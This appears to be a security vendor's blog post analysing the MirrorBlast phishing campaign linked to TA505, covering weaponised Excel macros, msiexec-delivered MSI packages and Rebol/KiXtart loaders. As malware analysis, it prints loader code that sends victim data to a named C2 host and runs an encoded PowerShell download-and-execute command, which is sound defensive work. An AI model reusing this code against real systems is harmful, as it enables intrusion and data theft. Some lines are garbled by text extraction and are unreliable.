There are many reasons for this, not least of which is the\ntrove of customer data the financial sector holds, as well as the funds to pay large sums of money to regain access to encrypted data.\n\n[The Morphisec Labs team has tracked a new version of a campaign targeting financial organizations. Dubbed “MirrorBlast” by ET Labs, the](https://twitter.com/ET_Labs/status/1441147196317974532?s=20)\ncurrent attack campaign the Labs team has tracked began in early September. There was similar activity in April 2021 as well, but the current\ncampaign began more recently.\n\nThe attack chain of the infection bears a similarity to the tactics, techniques, and procedures commonly used by the allegedly Russia-based\nthreat group TA505. The similarities extend to the attack chain, the GetandGo functionality, the final payload, and similarities in the domain\n\ntt\n\n\n-----\n\n[505](https://attack.mitre.org/groups/G0092/) as bee act e s ce at east 0 a d, as a as a a ysts ca asce ta, as a a c a ot at o o t e act o s s a g oup, 505\nis most known for frequently changing the malware they use as well as driving global trends in malware distribution.\n\nIn this blog post, we will examine the new MirrorBlast phishing campaign, from the initial delivery of a malicious Excel file to the end result of\nloading an additional payload.\n\n**Figure 1: The attack chain of MirrorBlast**\n\n## Technical introduction\n\nIn September we observed a malspam campaign delivering Excel documents as an attachment. This campaign targets multiple sectors from\nCanada, the United States, Hong Kong, Europe, and more.\n\nThe attack chain starts with an email attachment document, but at a later stage, it changes to use the Google feedproxy URL with SharePoint\nand OneDrive lure, which poses as a file share request. These URLs lead to a compromised SharePoint or a fake OneDrive site that the\nattackers use to evade detection, in addition to a sign-in requirement (SharePoint) that helps to evade sandboxes.\n\nFigure 2: A phishing email with the SharePoint lure theme.\n\n\n-----\n\n**Figure 3: A fake OneDrive website serving an Excel document (in German).**\n\n### Excel Document\n\nThe Excel document is weaponized with an extremely lightweight macro code.\n\n**Figure 4: A totally FUD Excel document.**\n\nThe macro code can be executed only on a 32-bit version of Office due to compatibility reasons with ActiveX objects (ActiveX control\ncompatibility). The macro code performs anti sandboxing by checking if the following queries are true:\n\nComputer name is equal to the user domain.\nUsername is equal to admin or administrator.\n\nWe have observed different variants of the document, in the first variants there wasn’t any anti-sandboxing and the macro code was hidden\nbehind the Language and Code document information properties, later it moved to the sheet cells. Additionally, the code has been added one\nmore obfuscation layer on top of the previous obfuscation\n\n\n-----\n\n**Figure 5: An Excel document with lightweight macro and anti-sandboxing.**\n\n[The command executes JScript through the AddCode method from the ScriptControl ActiveX object (ScriptControl Methods). This method](https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-6.0/aa227637(v=vs.60))\nloads and evaluates the code similarly to how Run or Evaluate executes the statement (the official documentation might be misleading).\n\nThe macro executes the following JScript:\n\n**Figure 6: An obfuscated JScript command.**\n\nThe evaluated deobfuscated command is:\n\n**Figure 7: The evaluated JScript.**\n\nThis spawns the msiexec.exe process, which is responsible for downloading and installing MSI package. It is also a known way to break an\n[attack chain sequence and complicate attack trajectory visibility (msiexec LOLBin). The msiexec.exe process executes not as a direct child](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)\nprocess of Excel.exe, this, with the addition of setting UILevel to - 2 (Completely silent installation) helps with sandbox evasion.\n\n### MSI package\n\nWe have observed two variants of the MSI installer: KiXtart and REBOL. Both variants are generated using the Windows Installer XML\n**Toolset (WiX) version - 3.11.0.1528; once executed they drop two files into a random directory in ProgramData. One of them is the legitimate**\nsoftware language interpreter executable (KiXtart or REBOL) and the other is the malicious script.\n\n**Figure 8: Rebol/KiXtart dropped in the ProgramData folder.**\n\nSome of the MSI packages included autorun persistence through `Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n\n\n-----\n\nFigure 9: MSI package registry properties.\n\n**REBOL variant**\n\n**[Rebol is a cross-platform data exchange language and a multi-paradigm dynamic programming language (http://www.rebol.com/). The first](http://www.rebol.com/)**\nstage Rebol script is base64 encoded.\n\nrebol[] do to-string debase\n\"YXR0ZW1wdFsKCWNhbGwge2VjaG8gJVVTRVJET01BSU4lXCVVU0VSTkFNRSUgPiBuYW1lICYmIGZvciAvZiAidG9rZW5zPTQtNSBkZWxpbXM\n\n**Code Block 1: The first-stage Rebol script.**\n\nNext, it exfiltrates targeted information by sending a base64 encoded GET request that represents the user domain, username, OS version,\narchitecture, along with a Rebol script build number (build=1.0.0). Older script versions don’t contain the build number. The C2 sends back a\nUUID that will be associated with the victim machine and will be used in future communications.\n```\ncall \"echo %USERDOMAIN%\\%USERNAME% > name && VER > os && echo %PROCESSOR_ARCHITECTURE% > arch\"\nwait 5\nreg: enbase join \"name=\" [trim/all read %name \"&os=\" trim/all read %os \"&arch=\" trim/all read %arch \"&build=1.0.0\"]\neither exists? %uuid [uuid: read %uuid] [\n\n```\n```\n   uuid: read join http://menorukis.su/p/r?x= reg\n  uuid: parse uuid \"|\"\n  uuid: uuid/2\n  write %uuid uuid\n]\n\n```\n**Code Block 2: The Rebol script sends the victim's data to the C2.**\n\nThen, the script will enter an infinite waiting loop where it sends the encoded UUID to the C2 while waiting for the response “3.”. Once it\nreceives the appropriate response, it will execute a Powershell command that downloads an archive file and extracts its content to a folder\nnamed archive. In that folder is the next stage of the Rebol script that will be executed.\n```\nwhile[true][\n  p: enbase join \"uuid=\" uuid\n  read join http://menorukis[.]su/p/m?x= p\n  a: read join http://menorukis[.]su/p/p?x= p\n  l: read join http://menorukis[.]su/p/d?x= p\n\n```\n```\n    call \"powershell.exe -exec bypass -enc\nJAB1AHUAaQBkACAAPQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8A\n    wait 5\n    do load %archive\\payload.rb\n    read join http://menorukis[.]su/p/p?x= enbase join \"uuid=\" [uuid \"&status=true\"]\n  ]\n\n```\n\n**Code Block 3: The loop waiting for the payload from the C2.**\n\n**Figure 10: The executed Powershell commands.**\n\nWe have also observed a newer version of Rebol script (build=1.0.2) that omits the Powershell execution part. Instead, it implements the\nsame logic with Rebol language code; this is done to decrease noise and script size (no PowerShell process execution as part of the attack\nchain). At the time of writing, we couldn’t retrieve the next stage Rebol script (payload.rb).\n\n**KiXtart variant**\n\n**[KiXtart is a free-format scripting language and has rich built-in functionality for easy scripting (http://www.kixtart.org/).](http://www.kixtart.org/)**\n\nThe dropped script is encrypted or, as the documentation suggests, tokenized script. The KiXtart documentation describes it as\n\n\n-----\n\np act ca te s t s ea s t at to e ed sc pts a e pe ect y sa e o atte pts at e g o c a g g t e by egu a e d use s\nHowever, tokenized scripts are not safe from attacks by people with enough time and determination on their side.” (Kixtart Pre-tokenizing\nscripts).\n\nQuickly searching for `Decrypt` in the strings leads to the corresponding subroutine where the decryption happens.\n\n**Figure 11: KiXtart executable - decryption function.**\n\nDumping the strings from memory after they were decrypted resulted in the following:\n\n**Figure 12: Strings from the dumped memory.**\n\nLooking at the strings along with the .pcap file we captured, we see that the script sends the victim’s machine information (domain, computer\nname, user name, process list) to the C2. The C2 responds with a number that will indicate how to proceed, as with the Rebol variant.\n\n### Attribution to TA505\n\nBelow are the TTPs that allows us to safely attribute the attack chain to TA505:\n\nInfection chain consists of Email -> XLS -> MSI (Rebol/KiXtart loader). The MSI component has a high resemblance to the Get2\n(GetandGo) loader from TA505\nUsing SharePoint/OneDrive lure theme.\nUsing cdn*dl*fileshare, *onedrive* or *dropbox* as part of the domain name.\nOne of the SharePoint lure themed emails lead to the following page:\n\n\n-----\n\n**gu e** **3** age t s atc ed 5 t e deta s pa e\n\nWe have noticed that the MD5 in the details pane doesn’t match the MD5 of the Excel document. In fact, this MD5 belongs to a legitimate\n[Putty SFTP client. This specific hash was mentioned in a related TA505 intrusion.](https://www.virustotal.com/gui/file/0e40ba8c2c0a2fcbb5290d131bb42651f90f33f5e230556736a5acb4ffd4251d/details)\nAccording to [@ffforward, the next-stage Rebol script leads to the FlawedGrace RAT that is associated with TA505 (malpedia-](https://twitter.com/ffforward/status/1446212189438754826?s=20)\nflawedgrace)\n\n## Conclusions\n\nTA505 is one of many financially motivated threat groups currently active in the marketplace. They are also one of the most creative, as they\nhave a tendency to constantly shift the attacks they leverage to achieve their goals. This new cyberattack for MirrorBlast is no exception for\nTA505 or for other innovative threat groups.\n\nIf anything, the shift in the attack chain is a further indication that organizations can ill afford to take a defensive, reactive approach to their\nsecurity. They must remain constantly vigilant, iterating on security procedures to ensure they are not caught off-guard when new TTPs are\ndeployed to breach their defenses.\n\nThe ability of the MirrorBlast attack to have very low detections in VirusTotal is also indicative of the focus most groups have on evading\ndetection-centric solutions. Yet again, it is clear that the market’s reliance on detection and response leaves them open to more attacks than it\nresolves. A new way forward is needed.\n\nMorphisec Labs continues to track this campaign, and will provide updates as necessary.\n\n## IOCs\n\n###
